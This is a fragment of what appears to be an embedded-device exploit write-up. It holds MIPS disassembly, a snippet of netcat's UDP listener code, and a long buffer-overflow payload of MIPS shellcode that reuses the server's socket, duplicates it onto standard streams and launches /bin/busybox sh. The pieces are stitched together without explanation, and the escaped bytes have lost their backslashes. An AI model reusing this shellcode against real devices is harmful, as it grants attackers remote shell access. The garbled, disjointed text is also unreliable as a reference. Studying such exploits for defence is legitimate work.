004020A4 8F BC 00 18 lw $gp, 0x7C+var_64($sp).text:
004020A8 8F 99 80 38 la $t9, close.text:
004020AC 03 20 F8 09 jalr $t9 ; close.text:
004020B0 02 00 20 21 move $a0, $s0 # fd.text:
004020B4.text:
004020B4 loc_4020B4: # CODE XREF: sub_401DF4+1AC↑j.text:
004020B4 # sub_401DF4+238↑j ....text:
004020B4 8F BF 00 84 lw $ra, 0x7C+var_s8($sp).text:
004020B8 8F B1 00 80 lw $s1, 0x7C+var_s4($sp).text:
004020BC 8F B0 00 7C lw $s0, 0x7C+var_s0($sp).text:
004020C0 03 E0 00 08 jr $ra.text:
004020C4 27 BD 00 88 addiu $sp, 0x88
} else if (uflag && !kflag) { /* * For UDP and not -k, we will use recvfrom() * initially to wait for a caller, then use * the regular functions to talk to the caller. */ int rv; char buf[2048]; struct sockaddr_storage z;
 len = sizeof(z); rv = recvfrom(s, buf, sizeof(buf), MSG_PEEK, (struct sockaddr *)&z, &len); if (rv == -1) err(1, "recvfrom");
 rv = connect(s, (struct sockaddr *)&z, len); if (rv == -1) err(1, "connect");
 if (family == AF_UNIX) { if (pledge("stdio unix", NULL) == -1) err(1, "pledge"); } if (vflag) report_sock("Connection received", (struct sockaddr *)&z, len, family == AF_UNIX ? host : NULL);
 readwrite(s, NULL);
bof_payload += "x3Cx1Cx00x42" # lui $gp, 0x42 bof_payload += "x27x9CxB0x30" # addiu $gp, $gp, -0x4fd0 bof_payload += "x8Fx82x80xB8" # la $v0, server_sockfd bof_payload += "x8Cx44x00x00" # lw $a0, (server_sockfd - 0x413134)($v0) # fd bof_payload += "x8Fx85x80xF4" # lw $a1, -0x7f0c($gp) bof_payload += "x24x0cxffxef" # li t4,-17 ( addrlen = 16 ) bof_payload += "x01x80x30x27" # nor a2,t4,zero bof_payload += "x24x02x10x4a" # li v0,4170 ( sys_connect ) bof_payload += "x01x01x01x0c" # syscall 0x40404
 bof_payload += "x3Cx1Cx00x42" # lui $gp, 0x42 bof_payload += "x27x9CxB0x30" # addiu $gp, $gp, -0x4fd0 bof_payload += "x8Fx82x80xB8" # la $v0, server_sockfd bof_payload += "x8Cx44x00x00" # lw $a0, (server_sockfd - 0x413134)($v0) # fd
 bof_payload += "x24x0fxffxfd" # li t7,-3 bof_payload += "x01xe0x28x27" # nor a1,t7,zero # bof_payload += "x8fxa4xffxff" # lw a0,-1(sp) bof_payload += "x24x02x0fxdf" # li v0,4063 ( sys_dup2 ) bof_payload += "x01x01x01x0c" # syscall 0x40404 bof_payload += "x20xa5xffxff" # addi a1,a1,-1 bof_payload += "x24x01xffxff" # li at,-1 bof_payload += "x14xa1xffxfb" # bne a1,at, dup2_loop
 # execve /bin/busybox sh bof_payload += "x28x06xFFxFF" # slti $a2, $zero, -1 bof_payload += "x3Cx0Fx2Fx62" # lui $t7, 0x2f62 bof_payload += "x35xEFx69x6E" # ori $t7, $t7, 0x696e bof_payload += "xAFxAFxFFxDC" # sw $t7, -0x24($sp) bof_payload += "x3Cx0Fx2Fx62" # lui $t7, 0x2f62 bof_payload += "x35xEFx75x73" # ori $t7, $t7, 0x7573 bof_payload += "xAFxAFxFFxE0" # sw $t7, -0x20($sp) bof_payload += "x3Cx0Fx79x62" # lui $t7, 0x7962 bof_payload += "x35xEFx6Fx78" # ori $t7, $t7, 0x6f78 bof_payload += "xAFxAFxFFxE4" # sw $t7, -0x1c($sp) bof_payload += "xAFxA0xFFxE8" # sw $zero, -0x18($sp) bof_payload += "x3Cx0Fx73x68" # lui $t7, 0x7368 bof_payload += "xAFxAFxFFxEC" # sw $t7, -0x14($sp) bof_payload += "xAFxA0xFFxF0" # sw $zero, -0x10($sp) bof_payload += "x27xAFxFFxDC" # addiu $t7, $sp, -0x24 bof_payload += "xAFxAFxFFxF4" # sw $t7, -0xc($sp) bof_payload += "x27xAFxFFxEC" # addiu $t7, $sp, -0x14 bof_payload += "xAFxAFxFFxF8" # sw $t7, -8($sp) bof_payload += "xAFxA0xFFxFC" # sw $zero, -4($sp) bof_payload += "x27xA4xFFxDC" # addiu $a0, $sp, -0x24 bof_payload += "x27xA5xFFxF8" # addiu $a1, $sp, -8 bof_payload += "x24x02x0FxAB" # addiu $v0, $zero, 0xfab bof_payload += "x01x01x01x0C" # syscall 0x40404
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1673431065.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673431066.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673431066.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673431066.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1673431066.png)